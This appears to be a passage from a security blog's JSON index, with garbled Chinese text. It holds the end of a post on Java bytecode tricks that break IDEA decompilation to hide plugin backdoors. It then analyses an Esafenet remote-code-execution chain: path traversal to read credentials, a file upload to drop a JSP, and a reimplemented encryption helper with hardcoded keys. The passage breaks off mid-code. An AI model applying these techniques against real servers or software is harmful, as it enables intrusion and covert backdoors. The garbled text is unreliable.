ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬é¦–è¦å…³å¿ƒçš„ä¸åº”è¯¥æ˜¯æ˜¯å¦éªŒè¯æœ‰å¼‚å¸¸ï¼Œè€Œæ˜¯å…³å¿ƒæ˜¯å¦èƒ½æ­£ç¡®æ‰§è¡Œï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬é€šè¿‡-Xnoverifyæ‰‹åŠ¨è·³è¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥å‘ç°æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥å°è¯•æ˜¯å¦èƒ½å¤Ÿæ¬ºéª—éªŒè¯è¿‡ç¨‹ï¼Œä»è€Œèƒ½å¤Ÿæ­£ç¡®æ‰§è¡Œï¼Œæˆ‘ä»¬ä»”ç»†æŸ¥çœ‹è¿™ä¸ªæŠ¥é”™åŸå› ï¼Œå‘ç°å…¶å®å’Œframeæœ‰å…³(ä»€ä¹ˆæ˜¯frameå¯è‡ªè¡Œç™¾åº¦)ï¼Œåœ¨è¿™é‡Œæ•™å¤§å®¶ä¸€ä¸ªASMçš„å°æŠ€å·§ æ—¢ç„¶å’ŒFRAMEæœ‰å…³é‚£ä¹ˆï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ç”Ÿæˆè¿™ä¸ªç±»çš„æ—¶å€™å°†å‚æ•°æ›¿æ¢ä¸ºClassWriter.COMPUTE_FRAMES,ä¸Šé¢ä¸€å¼€å§‹ä¹Ÿæåˆ°è¿‡è¿™ä¸ªå‚æ•°çš„ä½œç”¨(åœ¨å†™å…¥æ–¹æ³•å­—èŠ‚ç æ—¶ï¼Œä¼šè‡ªåŠ¨è®¡ç®—æ–¹æ³•çš„å †æ ˆæ˜ å°„å¸§å’Œå±€éƒ¨å˜é‡è¡¨çš„å¤§å°) å› æ­¤æˆ‘ä»¬åœ¨æ­¤ç”Ÿæˆç±»å¹¶è¿è¡Œå¯ä»¥å‘ç°ï¼ŒæŠ¥é”™å˜å¾—éå¸¸ç›´è§‚ï¼Œå¸§æ ˆçš„å¤§å°ä¸åŒ¹é… é‚£ä¹ˆæ—¢ç„¶å°‘äº†ä¸€ä¸ªæˆ‘ä»¬ä¾¿ç»™ä»–è¡¥é½ä¸€ä¸ªå³å¯(æ’å…¥ä»»æ„å¯¹è±¡ï¼Œä»…éªŒè¯å¤§å°çš„åŒ¹é…) å†æ¬¡ç”Ÿæˆè¿™ä¸ªç±»ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒVerifyErrorçš„é”™è¯¯æ¶ˆå¤±ï¼Œç¨‹åºæˆåŠŸè¿è¡Œï¼Œä¹Ÿè¾¾åˆ°äº†æˆ‘ä»¬æ··æ·†çš„ç›®çš„ å½“ç„¶æˆ‘ä»¬è¿˜èƒ½åšä»€ä¹ˆå‘¢ï¼Ÿæ¯”å¦‚ ç»§ç»­è°ƒæ•´start/end/handlerLabelçš„é¡ºåºï¼Œåªè¦ä¿è¯ç¨‹åºæ­£ç¡®æµå‘ å¤šä¸ªtry-catchç»“æ„çš„äº¤å‰æˆ–è€…é¦–å°¾é‡å  å…³æ³¨å…¶ä»–çš„ç‰¹æ®Šç»“æ„ å…³æ³¨javaåŠ¨æ€è¯­è¨€å’Œå‡½æ•°å¼ç¼–ç¨‹çš„ç‰¹æ€§çš„å®ç° â€¦â€¦.(è‡ªç”±å‘æŒ¥ï¼Œä¸»è¦æ˜¯çœ‹IDEAçš„ä»£ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°è¯•å»å¯¹æŠ—åæ··æ·†å·¥å…·ä¹Ÿå¾ˆæœ‰æ„æ€ï¼Œä¹Ÿèƒ½åšåˆ°æ¬ºéª—å®ç°çš„ä»£ç æ‰§è¡Œæˆ–è€…æŠ¥é”™) æ€»ç»“åœ¨è¿™æ¬¡è®®é¢˜åˆ†äº«å½“ä¸­æˆ‘ä»¬åšåˆ°äº†å¯¹æ–¹æ³•ã€å­—æ®µä»¥åŠä»£ç ç‰‡æ®µçš„éšè—ï¼ŒåŒæ—¶å®ç°äº†è‡ªå®šä¹‰çš„æ–¹æ³•å‚æ•°ä»¥åŠèƒ½å¤Ÿè®©IDEAåç¼–è¯‘æŠ¥é”™ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥çµæ´»ä½¿ç”¨è¿™äº›ç»“æœï¼Œæå‡è“é˜Ÿåç¼–è¯‘åˆ†æçš„éš¾åº¦ï¼Œä¸ºæ”»å‡»äº‰å–æ›´å¤šçš„æ—¶é—´ï¼ŒåŒæ—¶é’ˆå¯¹éšè—çš„æ··æ·†æ•ˆæœï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å…¶è¿ç”¨åˆ°å†™æ’ä»¶åé—¨çš„åœºæ™¯ï¼Œå®ç°ä¸€ä¸ªå®šå‘æŠ•æ¯’.","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"IDEA","slug":"IDEA","permalink":"https://y4tacker.github.io/tags/IDEA/"},{"name":"FernFlower","slug":"FernFlower","permalink":"https://y4tacker.github.io/tags/FernFlower/"}]},{"title":"äº¿èµ›é€šç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æµ…æ","slug":"year/2023/12/äº¿èµ›é€šç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æµ…æ","date":"2023-12-13T12:28:53.000Z","updated":"2024-08-04T09:01:49.888Z","comments":true,"path":"2023/12/13/year/2023/12/äº¿èµ›é€šç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æµ…æ/","link":"","permalink":"https://y4tacker.github.io/2023/12/13/year/2023/12/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/","excerpt":"","text":"äº¿èµ›é€šç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æµ…ææ¼æ´åˆ†ææœ€è¿‘å¤©å¤©æ›äº¿èµ›é€šçš„æ¼æ´ï¼Œåˆæ˜¯è¿™ä¸ªæ–°æ‰‹å‘çš„é¡¹ç›®ï¼Œæœ‰ç‚¹çƒ¦å…¶å®ä¸æ˜¯å¾ˆæƒ³å†™çš„ï¼Œæœ¬æ¬¡åŸç†ä¹Ÿå¾ˆç®€å• ç†Ÿæ‚‰çš„äººå¯èƒ½çŸ¥é“è¿™ä¸ªç³»ç»Ÿåœ¨windowsä¸linuxä¸‹æœ‰ç‚¹åŒºåˆ«ï¼Œåœ¨linuxç³»ç»Ÿä¸‹å¤šäº†ä¸€ä¸ª8021ç«¯å£ ç›¸è¾ƒäºCDGServer3æœåŠ¡ä¸‹åˆè‡­åˆé•¿çš„ä»£ç ï¼Œè¿™ä¸ªfileserverä¸‹çš„ä»£ç è¿˜æ˜¯å¾ˆçŸ­å°çš„ ä»»æ„æ–‡ä»¶è¯»å–åœ¨com.esafenet.fileserver.controller.LinuxUpdateController#dlUltrasecä¸‹ å¯ä»¥çœ‹åˆ°å…¶å®è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¾ˆç®€å•çš„æ–‡ä»¶è¯»å–åŠŸèƒ½ï¼Œè¿™é‡Œåªè¦filePathä¸typeä¸ä¸ºç©ºå³å¯ï¼Œå¾ˆç®€å•çš„ç›®å½•ç©¿è¶Šæ¼æ´ 1234567891011121314151617181920212223242526272829303132333435363738394041424344public void dlUltrasec(HttpServletRequest request, HttpServletResponse response) &#123; logger.info(&quot;è¿›å…¥KOä¸‹è½½ç¨‹åºï¼&quot;);.....çœç•¥..... String filePath = request.getParameter(&quot;path&quot;); String type = request.getParameter(&quot;type&quot;); if (StrUtil.isBlank(filePath) &amp;&amp; StrUtil.isBlank(type)) &#123; logger.error(&quot;filePathã€typeå‚æ•°ä¸ºç©º&quot;); return; &#125; if (&quot;1&quot;.equals(type)) &#123; type = &quot;ko&quot;; &#125; if (&quot;2&quot;.equals(type)) &#123; type = &quot;patch&quot;; &#125; filePath = this.fileService.getAbsolutePathLinux(type, filePath); File file = new File(filePath); logger.info(&quot;file exists:&quot; + file.exists()); if (file.exists()) &#123; logger.info(filePath + &quot; æ–‡ä»¶å­˜åœ¨&quot;); FileInputStream fis = new FileInputStream(file); response.addHeader(&quot;content-type&quot;, &quot;application/x-msdownload&quot;); response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot; + file.getName()); response.addHeader(&quot;Content-Length&quot;, String.valueOf(fis.available())); outputStream = response.getOutputStream(); bos = new BufferedOutputStream(outputStream); bis = new BufferedInputStream(fis); byte[] readByte = new byte[8192]; boolean var12 = false; int size; while((size = bis.read(readByte)) != -1) &#123; bos.write(readByte, 0, size); &#125; bos.flush(); &#125; else &#123; logger.error(&quot;downloadFile=&gt;æ–‡ä»¶ä¸å­˜åœ¨&quot; + JSON.toJSONString(resultMap)); &#125;.....çœç•¥...... ç®€å•æ¥çœ‹çœ‹getAbsolutePathLinuxçš„ä»£ç é€»è¾‘ 1234567891011121314151617@Value(&quot;$&#123;SQLurl&#125;&quot;)private String SQLurl;@Value(&quot;$&#123;file.path&#125;&quot;)private String basePath;public String getAbsolutePathLinux(String type, String filePath) &#123; if (!StringUtils.hasLength(this.basePath)) &#123; this.basePath = this.getResourcePath(); &#125; filePath = this.basePath + File.separator + &quot;linux&quot; + File.separator + type + File.separator + filePath; File file = new File(filePath); if (!file.exists()) &#123; file.mkdirs(); &#125; return filePath;&#125; è¿™ä¸ªå€¼æ¥æºäºé…ç½®æ–‡ä»¶,åŒæ—¶æˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶å½“ä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç”¨æˆ·åä¸å¯†ç (æ‰€ä»¥ä¹Ÿå¤§æ¦‚çŸ¥é“è¯»çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆäº†ï¼Œå°±æ˜¯è¿™ä¸ªjaråŒ…)ï¼ŒåŒæ—¶äº¿èµ›é€šç³»ç»Ÿçš„å®‰è£…è·¯å¾„ä¹Ÿæ˜¯å›ºå®šçš„ å› æ­¤é€šè¿‡ç›®å½•ç©¿è¶Šï¼Œæˆ‘ä»¬åªéœ€è¦è¯»å–/esafenet/fileServer/fileServer.jarå³å¯ æ–‡ä»¶ä¸Šä¼ è¿™ä¸ªåŠŸèƒ½ç‚¹åœ¨com.esafenet.fileserver.controller.FileController#uploadFile åœ¨è¿™ä¸ªæ§åˆ¶å™¨ä¸‹æœ‰ä¸¤ä¸ªå¼•äººæ³¨ç›®çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯applicationé…ç½®ä¸­çš„å†…å®¹ 1234@Value(&quot;$&#123;server.userName&#125;&quot;)private String userName;@Value(&quot;$&#123;server.password&#125;&quot;)private String password; ä¸Šä¼ çš„ä»£ç å¾ˆç®€å•ï¼Œåæ–°æ‰‹å‘ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰å‚æ•°æ ¡éªŒä»¥åŠåŠ å¯† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293public String uploadFile(@RequestParam(&quot;file&quot;) MultipartFile[] uploadfile, HttpServletRequest request) &#123;HashMap resultMap = new HashMap();.....çœç•¥...... boolean b = this.validateParamterForUpload(request, resultMap); String content; if (!b) &#123; content = CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap)); return content; &#125; content = request.getHeader(&quot;content&quot;); String json = CdgUtils.decode(content); JSONObject jsonObject = JSON.parseObject(json); Long offset = jsonObject.getLong(&quot;offset&quot;); long total = jsonObject.getLongValue(&quot;totalSize&quot;); String md5 = jsonObject.getString(&quot;md5&quot;); String loginName = jsonObject.getString(&quot;loginName&quot;); String srcPath = jsonObject.getString(&quot;filePath&quot;); int type = jsonObject.getIntValue(&quot;type&quot;); List&lt;Map&lt;String, Object&gt;&gt; list = new ArrayList(); if (uploadfile != null &amp;&amp; uploadfile.length &gt; 0) &#123; for(int i = 0; i &lt; uploadfile.length; ++i) &#123; MultipartFile file = uploadfile[i]; if (file.getSize() != 0L) &#123; File targetfile = null; String newPath; HashMap item; if (type == 1) &#123; newPath = this.fileService.getDirPath((String)null); String filename = srcPath.substring(1); targetfile = new File(newPath, filename); if (offset != null) &#123; this.uploadByBlock(list, offset, targetfile, md5, file); &#125; else &#123; file.transferTo(targetfile); item = new HashMap(); item.put(&quot;fileSize&quot;, targetfile.length()); item.put(&quot;filePath&quot;, this.fileService.getRelativePath(targetfile.getAbsolutePath())); list.add(item); &#125; &#125; else if (type == 2) &#123; newPath = this.getbackupFilePath(srcPath); if (newPath != null) &#123; targetfile = new File(newPath); File dir = targetfile.getParentFile(); if (!dir.exists()) &#123; dir.mkdirs(); &#125; if (offset != null) &#123; this.uploadByBlock(list, offset, targetfile, md5, file); &#125; else &#123; file.transferTo(targetfile); item = new HashMap(); item.put(&quot;fileSize&quot;, targetfile.length()); item.put(&quot;filePath&quot;, this.fileService.getRelativePath(targetfile.getAbsolutePath())); list.add(item); &#125; &#125; &#125; if (targetfile.length() == total) &#123; Map&lt;String, String&gt; param = new HashMap(); param.put(&quot;md5&quot;, md5); this.fileService.deleteFileInfo(param); &#125; &#125; &#125; &#125; resultMap.put(&quot;fileList&quot;, list); resultMap.put(&quot;code&quot;, 1); resultMap.put(&quot;msg&quot;, &quot;æˆåŠŸ&quot;); return CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap)); &#125; logger.error(&quot;æ–‡ä»¶ä¸Šä¼ å¹¶å‘æ€»æ•°åˆ°è¾¾ä¸Šé™ï¼Œç¦æ­¢å¹¶ä¸Šä¼ &quot;); resultMap.put(&quot;code&quot;, 0); resultMap.put(&quot;msg&quot;, &quot;æ–‡ä»¶ä¸Šä¼ å¹¶å‘æ€»æ•°åˆ°è¾¾ä¸Šé™ï¼Œç¦æ­¢å¹¶ä¸Šä¼ &quot;); var4 = CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap));&#125; catch (Exception var25) &#123; var25.printStackTrace(); logger.error(&quot;uploadFile=&gt;&quot; + var25.getMessage()); resultMap.put(&quot;code&quot;, 0); resultMap.put(&quot;msg&quot;, var25.getMessage() + &quot;&quot;); return CdgUtils.getInstance().sendInfo(JSON.toJSONString(resultMap));&#125; finally &#123; semaphoreUpload.release(); System.out.println(&quot;é‡Šæ”¾é€šè·¯æ•°ï¼š&quot; + semaphoreUpload.availablePermits());&#125;return var4;&#125; é¦–å…ˆè¿™é‡Œé€šè¿‡validateParamterForUploadå¯¹å‚æ•°åšäº†é™åˆ¶ï¼Œè¦æ±‚Headerä¸­å­˜åœ¨contentå‚æ•°ï¼ŒåŒæ—¶è§£å¯†åè¦å­˜åœ¨ä»¥ä¸‹å‚æ•° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758private boolean validateParamterForUpload(HttpServletRequest request, Map&lt;String, Object&gt; resultMap) throws Exception &#123; String content = request.getHeader(&quot;content&quot;); if (!StringUtils.hasLength(content)) &#123; resultMap.put(&quot;code&quot;, 2); resultMap.put(&quot;msg&quot;, &quot;å‚æ•°é”™è¯¯&quot;); return false; &#125; else &#123; String json = CdgUtils.decodeContent(content); if (!StringUtils.hasLength(json)) &#123; resultMap.put(&quot;code&quot;, 2); resultMap.put(&quot;msg&quot;, &quot;å‚æ•°é”™è¯¯&quot;); return false; &#125; else &#123; JSONObject jsonObject = JSON.parseObject(json); String serverUserName = jsonObject.getString(&quot;userName&quot;); String serverPwd = jsonObject.getString(&quot;pwd&quot;); String loginName = jsonObject.getString(&quot;loginName&quot;); String filePath = jsonObject.getString(&quot;filePath&quot;); long timestamp = jsonObject.getLongValue(&quot;timestamp&quot;); Integer type = jsonObject.getInteger(&quot;type&quot;); if (!StringUtils.hasLength(serverUserName)) &#123; resultMap.put(&quot;code&quot;, 3); resultMap.put(&quot;msg&quot;, &quot;æ–‡ä»¶æœåŠ¡å™¨ç”¨æˆ·åä¸ºç©º&quot;); return false; &#125; else if (!StringUtils.hasLength(serverPwd)) &#123; resultMap.put(&quot;code&quot;, 4); resultMap.put(&quot;msg&quot;, &quot;æ–‡ä»¶æœåŠ¡å™¨ç”¨æˆ·å¯†ç ä¸ºç©º&quot;); return false; &#125; else if (!StringUtils.hasLength(loginName)) &#123; resultMap.put(&quot;code&quot;, 5); resultMap.put(&quot;msg&quot;, &quot;CDGæœåŠ¡å™¨ç”¨æˆ·ç™»å½•åä¸ºç©º&quot;); return false; &#125; else if (!StringUtils.hasLength(String.valueOf(timestamp))) &#123; resultMap.put(&quot;code&quot;, 6); resultMap.put(&quot;msg&quot;, &quot;æ¥å£è°ƒç”¨æ—¶é—´æˆ³ä¸ºç©º&quot;); return false; &#125; else if (type == null) &#123; resultMap.put(&quot;code&quot;, 7); resultMap.put(&quot;msg&quot;, &quot;ä¸Šä¼ ç±»å‹ä¸ºç©º&quot;); return false; &#125; else if (!serverUserName.equals(this.userName)) &#123; resultMap.put(&quot;code&quot;, 9); resultMap.put(&quot;msg&quot;, &quot;æ–‡ä»¶æœåŠ¡å™¨ç”¨æˆ·åä¸æ­£ç¡®&quot;); return false; &#125; else if (!serverPwd.equals(this.password)) &#123; resultMap.put(&quot;code&quot;, 10); resultMap.put(&quot;msg&quot;, &quot;æ–‡ä»¶æœåŠ¡å™¨ç”¨å¯†ç ä¸æ­£ç¡®&quot;); return false; &#125; else if (type == 2 &amp;&amp; !StringUtils.hasLength(filePath)) &#123; resultMap.put(&quot;code&quot;, 11); resultMap.put(&quot;msg&quot;, &quot;æ–‡ä»¶å¤‡ä»½è·¯å¾„ä¸ºç©º&quot;); return false; &#125; else &#123; return true; &#125; &#125; &#125; &#125; è™½ç„¶è¿™ä¸ªç«™ç‚¹æ˜¯springçš„ï¼Œä½†æ˜¯å¯¹åº”å¦ä¸€ä¸ªç«¯å£çš„æœåŠ¡ç¡®æ˜¯tomcaté¡¹ç›®ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å‘å¯¹åº”ä½ç½®å†™ä¸ªjspå³å¯ï¼Œå…·ä½“ç»†èŠ‚ä¸å†å¤šè¯´ å¯¹äºåŠ å¯†ä¸è§£å¯†æˆ‘è¿™é‡Œæ•´ç†äº†ä¸€ä¸‹ï¼Œæ¢³ç†äº†ä¸‹æœ€å°é€»è¾‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527import java.lang.reflect.Array;import java.security.InvalidKeyException;import java.security.MessageDigest;import java.util.concurrent.ConcurrentHashMap;public class Y4Uitls &#123; static final int[] alog = new int[256]; static final int[] log = new int[256]; static final byte[] S = new byte[256]; static final byte[] Si = new byte[256]; static final int[] T1 = new int[256]; static final int[] T2 = new int[256]; static final int[] T3 = new int[256]; static final int[] T4 = new int[256]; static final int[] T5 = new int[256]; static final int[] T6 = new int[256]; static final int[] T7 = new int[256]; static final int[] T8 = new int[256]; static final int[] U1 = new int[256]; static final int[] U2 = new int[256]; static final int[] U3 = new int[256]; static final int[] U4 = new int[256]; static final byte[] rcon = new byte[30]; static final int[][][] shifts = new int[][][]&#123;&#123;new int[2], &#123;1, 3&#125;, &#123;2, 2&#125;, &#123;3, 1&#125;&#125;, &#123;new int[2], &#123;1, 5&#125;, &#123;2, 4&#125;, &#123;3, 3&#125;&#125;, &#123;new int[2], &#123;1, 7&#125;, &#123;3, 5&#125;, &#123;4, 4&#125;&#125;&#125;; private static final char[] HEX_DIGITS = new char[]&#123;&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;&#125;; private static byte remain_low; private static byte remain_up; private static byte upper_bit_add_0100; private static byte upper_bit_add_0101; private static byte[] key2; private static final int ENCRYPT_GROUP_LEN = 16; private static final int BLOCK_LEN = 16; private volatile ConcurrentHashMap&lt;String, Integer&gt; clientStatusMap = new ConcurrentHashMap(1000); private static char[] hexDigits; private static String publicKey; public static final String KEY_ALGORITHM = &quot;RSA&quot;; private static final int MAX_DECRYPT_BLOCK = 128; private String hardId = &quot;&quot;; private static MessageDigest messagedigest; static &#123; remain_low = (byte)15; remain_up = (byte)-16; upper_bit_add_0100 = (byte)64; upper_bit_add_0101 = (byte)80; key2 = new byte[]&#123;-21, -112, 90, -68, 5, 44, 85, -86, -21, -112, 90, -68, 5, 44, 85, -86&#125;; hexDigits = new char[]&#123;&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;; publicKey = &quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdd6QFVUF/86PA5EH0z0QcGDqCV7vKZA7DdNK6wYiA1TY1iRxKpsgWRgh4eTOxzdHdpEmvGZro/rxB5cDO3f/zui5jH+FK+EZZ4WL/6SbdYL1EmxOqj2E7WNhM4hCcai3oaqvvTuZOXZVeP4leHA4CGswvOlpUXTU6tbpcXYe6+wIDAQAB&quot;; messagedigest = null; &#125; static &#123; alog[0] = 1; int var2; int var16; for(var2 = 1; var2 &lt; 256; ++var2) &#123; var16 = alog[var2 - 1] &lt;&lt; 1 ^ alog[var2 - 1]; if ((var16 &amp; 256) != 0) &#123; var16 ^= 283; &#125; alog[var2] = var16; &#125; for(var2 = 1; var2 &lt; 255; log[alog[var2]] = var2++) &#123; &#125; byte[][] var4 = new byte[][]&#123;&#123;1, 1, 1, 1, 1, 0, 0, 0&#125;, &#123;0, 1, 1, 1, 1, 1, 0, 0&#125;, &#123;0, 0, 1, 1, 1, 1, 1, 0&#125;, &#123;0, 0, 0, 1, 1, 1, 1, 1&#125;, &#123;1, 0, 0, 0, 1, 1, 1, 1&#125;, &#123;1, 1, 0, 0, 0, 1, 1, 1&#125;, &#123;1, 1, 1, 0, 0, 0, 1, 1&#125;, &#123;1, 1, 1, 1, 0, 0, 0, 1&#125;&#125;; byte[] var5 = new byte[]&#123;0, 1, 1, 0, 0, 0, 1, 1&#125;; byte[][] var7 = new byte[256][8]; var7[1][7] = 1; int var6; for(var2 = 2; var2 &lt; 256; ++var2) &#123; var16 = alog[255 - log[var2]]; for(var6 = 0; var6 &lt; 8; ++var6) &#123; var7[var2][var6] = (byte)(var16 &gt;&gt;&gt; 7 - var6 &amp; 1); &#125; &#125; byte[][] var8 = new byte[256][8]; for(var2 = 0; var2 &lt; 256; ++var2) &#123; for(var6 = 0; var6 &lt; 8; ++var6) &#123; var8[var2][var6] = var5[var6]; for(var16 = 0; var16 &lt; 8; ++var16) &#123; var8[var2][var6] = (byte)(var8[var2][var6] ^ var4[var6][var16] * var7[var2][var16]); &#125; &#125; &#125; for(var2 = 0; var2 &lt; 256; ++var2) &#123; S[var2] = (byte)(var8[var2][0] &lt;&lt; 7); for(var6 = 1; var6 &lt; 8; ++var6) &#123; byte[] var10000 = S; var10000[var2] = (byte)(var10000[var2] ^ var8[var2][var6] &lt;&lt; 7 - var6); &#125; Si[S[var2] &amp; 255] = (byte)var2; &#125; byte[][] var9 = new byte[][]&#123;&#123;2, 1, 1, 3&#125;, &#123;3, 2, 1, 1&#125;, &#123;1, 3, 2, 1&#125;, &#123;1, 1, 3, 2&#125;&#125;; byte[][] var10 = new byte[4][8]; for(var2 = 0; var2 &lt; 4; ++var2) &#123; for(var16 = 0; var16 &lt; 4; ++var16) &#123; var10[var2][var16] = var9[var2][var16]; &#125; var10[var2][var2 + 4] = 1; &#125; byte[][] var13 = new byte[4][4]; for(var2 = 0; var2 &lt; 4; ++var2) &#123; byte var11 = var10[var2][var2]; if (var11 == 0) &#123; for(var6 = var2 + 1; var10[var6][var2] == 0 &amp;&amp; var6 &lt; 4; ++var6) &#123; &#125; if (var6 == 4) &#123; throw new RuntimeException(&quot;G matrix is not invertible&quot;); &#125; for(var16 = 0; var16 &lt; 8; ++var16) &#123; byte var12 = var10[var2][var16]; var10[var2][var16] = var10[var6][var16]; var10[var6][var16] = var12; &#125; var11 = var10[var2][var2]; &#125; for(var16 = 0; var16 &lt; 8; ++var16) &#123; if (var10[var2][var16] != 0) &#123; var10[var2][var16] = (byte)alog[(255 + log[var10[var2][var16] &amp; 255] - log[var11 &amp; 255]) % 255]; &#125; &#125; for(var6 = 0; var6 &lt; 4; ++var6) &#123; if (var2 != var6) &#123; for(var16 = var2 + 1; var16 &lt; 8; ++var16) &#123; var10[var6][var16] = (byte)(var10[var6][var16] ^ mul(var10[var2][var16], var10[var6][var2])); &#125; var10[var6][var2] = 0; &#125; &#125; &#125; for(var2 = 0; var2 &lt; 4; ++var2) &#123; for(var16 = 0; var16 &lt; 4; ++var16) &#123; var13[var2][var16] = var10[var2][var16 + 4]; &#125; &#125; for(var6 = 0; var6 &lt; 256; ++var6) &#123; byte var14 = S[var6]; T1[var6] = mul4(var14, var9[0]); T2[var6] = mul4(var14, var9[1]); T3[var6] = mul4(var14, var9[2]); T4[var6] = mul4(var14, var9[3]); var14 = Si[var6]; T5[var6] = mul4(var14, var13[0]); T6[var6] = mul4(var14, var13[1]); T7[var6] = mul4(var14, var13[2]); T8[var6] = mul4(var14, var13[3]); U1[var6] = mul4(var6, var13[0]); U2[var6] = mul4(var6, var13[1]); U3[var6] = mul4(var6, var13[2]); U4[var6] = mul4(var6, var13[3]); &#125; rcon[0] = 1; int var15 = 1; for(var6 = 1; var6 &lt; 30; rcon[var6++] = (byte)(var15 = mul(2, var15))) &#123; &#125; &#125; static final int mul(int var0, int var1) &#123; return var0 != 0 &amp;&amp; var1 != 0 ? alog[(log[var0 &amp; 255] + log[var1 &amp; 255]) % 255] : 0; &#125; static final int mul4(int var0, byte[] var1) &#123; if (var0 == 0) &#123; return 0; &#125; else &#123; var0 = log[var0 &amp; 255]; int var2 = var1[0] != 0 ? alog[(var0 + log[var1[0] &amp; 255]) % 255] &amp; 255 : 0; int var3 = var1[1] != 0 ? alog[(var0 + log[var1[1] &amp; 255]) % 255] &amp; 255 : 0; int var4 = var1[2] != 0 ? alog[(var0 + log[var1[2] &amp; 255]) % 255] &amp; 255 : 0; int var5 = var1[3] != 0 ? alog[(var0 + log[var1[3] &amp; 255]) % 255] &amp; 255 : 0; return var2 &lt;&lt; 24 | var3 &lt;&lt; 16 | var4 &lt;&lt; 8 | var5; &#125; &#125; public static Object makeKey(byte[] var0) throws InvalidKeyException &#123; return makeKey(var0, 16); &#125; public static byte[] blockEncrypt(byte[] var0, int var1, Object var2) &#123; int[][] var3 = (int[][])((Object[])var2)[0]; int var4 = var3.length - 1; int[] var5 = var3[0]; int var6 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[0]; int var7 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[1]; int var8 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[2]; int var9 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[3]; for(int var14 = 1; var14 &lt; var4; ++var14) &#123; var5 